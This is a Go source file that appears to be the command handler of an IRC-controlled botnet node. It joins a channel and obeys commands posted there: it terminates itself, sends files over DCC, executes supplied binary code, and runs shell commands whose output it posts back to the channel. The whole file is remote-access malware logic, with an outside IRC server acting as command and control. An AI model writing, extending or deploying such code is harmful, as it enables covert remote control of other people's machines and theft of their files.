package main

import irc "gopkg.in/irc.v3"

func handler(c *irc.Client, m *irc.Message) {
	switch {
	// join channel on welcome command 001
	case m.Command == "001":
		c.Write("JOIN " + CHANNEL)
	// terminate node
	case m.Command == "PRIVMSG" && c.FromChannel(m) && m.Params[1] == "terminate":
		terminate()
	// file transfer over dcc
	case m.Command == "PRIVMSG" && c.FromChannel(m) && m.Params[1] == "transfer":
		transfer()
	// byte code execution
	case m.Command == "PRIVMSG" && c.FromChannel(m) && readCommand(m.Params[1]) == "bin":
		var ok string
		if binaryExecute(m.Params[1]) {
			ok = "[OK]" // if executed code didnt return error
		} else {
			ok = "[!OK]" // opposite
		}

		c.WriteMessage(&irc.Message{
			Command: "PRIVMSG",
			Params: []string{
				m.Params[0],
				ok,
			},
		})
	// pass every message from channel to executeCommand / return its output
	case m.Command == "PRIVMSG" && c.FromChannel(m) && readCommand(m.Params[1]) == "sh":
		c.WriteMessage(&irc.Message{
			Command: "PRIVMSG",
			Params: []string{
				m.Params[0],
				shellExecute(splitParams(m.Params[1], 0, 1, 2)),
			},
		})
	}
}